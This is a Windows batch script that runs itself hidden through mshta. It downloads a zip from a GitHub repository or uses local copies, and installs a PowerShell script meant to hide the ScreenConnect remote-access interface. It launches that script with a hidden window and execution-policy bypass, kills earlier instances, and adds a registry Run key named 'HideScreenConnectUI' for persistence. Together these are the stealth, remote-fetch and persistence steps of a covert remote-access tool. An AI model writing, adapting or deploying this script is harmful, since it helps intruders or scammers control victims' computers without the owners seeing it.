@echo off
setlocal EnableExtensions

if /I "%~1"=="uninstall" goto :uninstall
if /I "%~1"=="_" goto :install

set "SELF=%~f0"
mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%SELF%\"\" _\"',0,false);close()"
exit /b 0

:install
set "INSTALL_DIR=%LOCALAPPDATA%\hide"
set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%TEMP%\hidezip-main\hide-sc.zip"
set "LOCAL_ZIP=%~dp0hide-sc.zip"
set "LOCAL_PS1=%~dp0hide-sc.ps1"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

if not exist "%PS%" exit /b 1

if exist "%LOCAL_PS1%" goto :from_ps1
if exist "%LOCAL_ZIP%" goto :from_zip
goto :from_github

:from_ps1
"%PS%" -NoProfile -WindowStyle Hidden -Command "New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; Copy-Item -LiteralPath '%LOCAL_PS1%' -Destination '%SCRIPT%' -Force"
if errorlevel 1 exit /b 1
goto :start_hider

:from_zip
"%PS%" -NoProfile -WindowStyle Hidden -Command "New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; if(Test-Path '%INSTALL_DIR%'){Get-ChildItem '%INSTALL_DIR%' | Remove-Item -Recurse -Force}; Expand-Archive -LiteralPath '%LOCAL_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if errorlevel 1 exit /b 1
goto :start_hider

:from_github
"%PS%" -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%' -UseBasicParsing"
if errorlevel 1 exit /b 1
"%PS%" -NoProfile -WindowStyle Hidden -Command "$d='%INSTALL_DIR%'; New-Item -ItemType Directory -Path $d -Force | Out-Null; $b=Join-Path $env:TEMP 'hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $env:TEMP -Force; if(Test-Path $d){Get-ChildItem $d | Remove-Item -Recurse -Force}; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath $d -Force"
if errorlevel 1 exit /b 1

:start_hider
if not exist "%SCRIPT%" exit /b 1

for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq powershell.exe" /FO LIST 2^>nul ^| find "PID:"') do (
    wmic process where "ProcessId=%%a" get CommandLine 2^>nul | find "hide-sc.ps1" >nul && taskkill /PID %%a /F >nul 2>&1
)

start "" "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HideScreenConnectUI" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f >nul 2>&1
exit /b 0

:uninstall
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HideScreenConnectUI" /f >nul 2>&1
for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq powershell.exe" /FO LIST 2^>nul ^| find "PID:"') do (
    wmic process where "ProcessId=%%a" get CommandLine 2>nul | find "hide-sc.ps1" >nul && taskkill /PID %%a /F >nul 2>&1
)
if exist "%LOCALAPPDATA%\hide" rmdir /s /q "%LOCALAPPDATA%\hide" >nul 2>&1
if exist "%SystemRoot%\System32\hide" rmdir /s /q "%SystemRoot%\System32\hide" >nul 2>&1
exit /b 0
